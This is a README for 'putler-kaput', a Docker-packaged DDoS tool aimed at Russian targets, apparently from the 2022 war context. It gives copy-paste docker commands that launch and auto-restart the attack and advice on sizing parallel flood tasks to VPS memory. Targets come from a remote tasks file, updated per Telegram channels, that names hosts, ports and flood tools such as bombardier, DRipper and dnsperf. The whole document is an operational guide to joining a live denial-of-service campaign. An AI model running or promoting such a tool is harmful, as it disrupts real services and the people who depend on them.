## Short How-to
1. Install Docker (todo: add a link to the manual).
2. Read Options section and figure out a suitable `-c` option value.
3. Run it, replacing the `4` in `-c4` with your value from the previous step. 
```shell
docker run -d --restart unless-stopped --name putler-kaput supersmile2009/putler-kaput:latest -c4
```
4. Enjoy the fall of the Putin's Empire.

## Running the DDoS attack
#### 1. Starting the container
_Note: before running it, read the Options section. You have to set a correct value for the `-c` option._
```shell
docker run -d --restart unless-stopped --name putler-kaput supersmile2009/putler-kaput:latest -c4
```
It will start the container in background. If you want it run it interactively (attach current shell to container),
replace `-d` with `-it`.

#### 2. Checking the logs
To see the logs of the running container, it you started it with `-d`:
```shell
docker container logs -n 200 -f putler-kaput
```
You can press Ctrl+C to stop following the logs. It will not stop your container. 

#### 3. Update the docker image and restart 
Update container and restart
```shell
docker stop putler-kaput &&\
  docker rm putler-kaput &&\
  docker pull supersmile2009/putler-kaput:latest &&\
  docker run -d --restart unless-stopped --name putler-kaput supersmile2009/putler-kaput:latest -c4
```


## Options:
#### `-c` - number of tasks executed in parallel  
E. g. `-c4`. In general up to 200-250MB of RAM is required for a single task.
4 is OK for a fresh Ubuntu 20.04 on a VPS with 1GB RAM, but make sure you have swap enabled.
Swap is rarely used, but in certain rare combinations of tasks free RAM may not bee enough.
Or run it with `-c3` to be on the safe side without swap.
`-c8` or `-c9` should be fine for a 2GB RAM VPS. 
#### `--tasks-file`, `-f` - load tasks from a local file
E. g. `--tasks-file=/tmp/tasks.json`. File will be reloaded every minute. You can edit or replace it any time.
This option takes precedence over `--tasks-url`.
Make sure you mount it to the container, e. g. `-v /path/to/tasks.json:/tmp/tasks.json`
#### `--tasks-url`, `-u` - load tasks from url.
E. g. `--tasks-url=https://example.com/tasks.json`. Tasks will be reloaded every minute.
Defaults to `https://raw.githubusercontent.com/supersmile2009/putler-kaput-tasks/master/tasks.json` - [repo link](https://github.com/supersmile2009/putler-kaput-tasks)
Tasks in that file are updated according to recommendations from https://t.me/ddos_separ and https://t.me/ddosKotyky


## Tasks file format
JSON file with a hash-map.
See example in https://github.com/supersmile2009/putler-kaput-tasks.

Key is the task id (string).

Value is the Task object. Task object properties:

`host` - string, hostname or ip address to attack. Use IP for dns-perf and ddos-ripper, auto-resolve isn't implemented yet.

`port` - int, pretty obvious

`executor` - enum string, always `exec`. Other executors aren't implemented yet, and probably never will be.

`app` - enum string, one of `bombardier`, `dripper`, `dnsperf`. Other apps may be added in the future.

`enabled` - bool. Task will be ignored if set to false.

`durationSecs` - int. How long a single run of the task should last, amount of time in seconds.

`args` - app-specific command-line arguments. So far used only for DRipper. See [DRipper repo](https://github.com/alexmon1989/russia_ddos) for details.
